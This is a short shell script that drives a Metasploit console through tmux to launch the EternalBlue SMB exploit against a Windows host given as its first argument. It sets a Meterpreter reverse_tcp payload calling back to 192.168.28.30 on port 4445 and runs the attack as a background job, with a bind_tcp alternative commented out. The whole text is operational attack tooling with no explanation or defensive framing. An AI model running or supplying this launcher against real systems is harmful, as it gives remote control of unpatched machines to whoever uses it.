tmux new -s msfcsl -d
tmux send -t "msfcsl" "use  exploit/windows/smb/ms17_010_eternalblue" Enter
tmux send -t "msfcsl" "set payload windows/meterpreter/reverse_tcp" Enter
tmux send -t "msfcsl" "set LHOST     192.168.28.30" Enter
#tmux send -t "msfcsl" "set payload windows/meterpreter/bind_tcp" Enter
tmux send -t "msfcsl" "set LPORT     4445" Enter
tmux send -t "msfcsl" "set RHOST     $1" Enter
tmux send -t "msfcsl" "run -j -z" Enter
